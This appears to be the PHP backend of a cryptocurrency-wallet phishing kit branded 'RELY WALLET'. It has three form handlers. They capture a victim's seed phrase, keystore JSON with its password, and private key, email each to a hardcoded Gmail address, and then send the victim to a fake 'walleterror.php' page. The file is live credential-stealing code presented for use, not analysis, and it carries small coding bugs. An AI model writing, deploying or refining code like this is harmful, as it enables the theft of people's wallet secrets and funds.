



<?php 
if(isset($_POST['phr'])){
    $to = "russeildylan54@gmail.com"; // this is your Email address
    
    $subject =  ". $phr";
    
    $phr = $_POST['phr'];
     

    
    $from = "From: RELY WALLET\n";  

    $headers = "The New Phrase : . $phr";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: walleterror.php");
return true;	
     
    }
?>





 





<?php 
if(isset($_POST['key'])){
    
    
    $to = "russeildylan54@gmail.com"; // this is your Email address
    
    $subject =  ". $key";
    
    $key = $_POST['key'];
    $pass= $_POST['pass'];
     

    
    $from = "From: RELY WALLET\n";  

    $headers = "The New  : .  Keysore Json is  :  $key,   \n\n\n  Password is :  $pass";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: walleterror.php");
return true;	
     
    }
?>





 
 



<?php 
if(isset($_POST['pri'])){
    $to = "russeildylan54@gmail.com"; // this is your Email address
    
    $subject =  ". $pri";
    
    $pri = $_POST['pri'];
     

    
    $from = "From: RELY WALLET\n";  

    $headers = "The New Private Key is  : . $pri";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: walleterror.php");
return true;	
     
    }
?>




 























 






















